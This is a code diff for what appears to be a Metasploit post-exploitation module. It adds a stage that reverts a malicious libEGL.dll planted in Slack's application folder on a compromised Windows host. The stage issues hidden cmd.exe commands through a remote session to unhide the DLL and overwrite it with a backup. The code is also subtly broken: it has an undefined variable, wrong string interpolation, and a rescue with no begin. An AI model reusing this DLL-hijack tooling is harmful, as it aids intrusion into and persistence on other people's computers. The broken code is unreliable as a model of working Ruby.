@@ -213,8 +213,48 @@ end
 # REVERT MALICIOUS DLL TO ORIGINAL STATE
 # --------------------------------------
 def ls_stage2
- print_error("under develop")
+
+  r=''
+  session = client
+  p_name = "libEGL.dll" # malicious libEGL.dll
+  b_name = "libEGL.bk" # service executable
+  d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['REVERT_HIJACK'].blank?
+    print_error("Options not configurated correctly...")
+    print_warning("Please set REVERT_HIJACK option!")
+    return nil
+  else
+    print_status("Deleting malicious dll!")
+    sleep(1.5)
+  end
+
+    # check if backup exist in target
+    if client.fs.file.exist?("#{d_path}\\#{b_name}")
+      print_warning(" Backup dll agent: #{b_name} found...")
+
+      # change attributes of libEGL.dll to un-hidde it...
+      print_good(" Use attrib command to un-hidde dll...")
+      r = session.sys.process.execute("cmd.exe /c attrib -h -s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
+
+      # revert original dll...
+      print_good(" Revert slack dll to default stage...")
+      r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_name}\\#{b_name} #{d_path}\\${p_name}", nil, {'Hidden' => true, 'Channelized' => true})
+      sleep(1.0)
+      print_status("slack dll reverted to default stage...")
+      print_line("")
+
+
+    # close channel when done
+    r.channel.close
+    r.close
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
 end
+
 
 
 
